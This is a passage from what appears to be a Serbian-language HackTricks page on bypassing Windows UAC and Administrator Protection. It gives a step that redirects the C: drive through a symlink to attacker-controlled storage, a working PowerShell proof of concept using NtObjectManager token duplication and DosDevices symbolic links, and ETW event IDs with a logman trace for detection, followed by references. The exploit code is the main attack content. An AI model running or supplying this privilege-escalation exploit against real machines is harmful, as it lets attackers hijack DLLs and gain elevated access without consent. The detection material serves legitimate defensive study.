3. Kreirajte `C:` symlink koji pokazuje na storage pod kontrolom napadača; naredni filesystem pristupi u toj sesiji razrešavaće `C:` na putanju napadača, što omogućava DLL/file hijack bez prompta.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
Na preview hostovima, Administrator Protection beleži odobrenja i neuspehe kao ETW događaje **15031** i **15032** u okviru provajdera `Microsoft-Windows-LUA`. Događaji sadrže SID podnosioca zahteva, putanju aplikacije, ishod, nalog administratora kojim se upravlja i metod autentikacije, tako da ponovljeni pokušaji exploit-a ili neuspešno upravljanje UI-jem nisu bez telemetrije.<sup>[[10]](#references)</sup>
```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Kako funkcioniše User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Kolekcija tehnika za UAC bypass](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Skener kompatibilnosti i launcher za UAC bypass](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI koristi AI za generisanje PowerShell backdoor-a](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operacija TrueChaos: Iskorišćavanje 0-day ranjivosti protiv ciljeva vlada jugoistočne Azije](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Zaobilaženje Windows Administrator Protection zaštite](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – UAC bypass pomoću SilentCleanup zadatka](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – UnifiedConsent, TabTip i Narrator Always Notify bypass metode](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Administrator protection](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
{{#include ../../banners/hacktricks-training.md}}
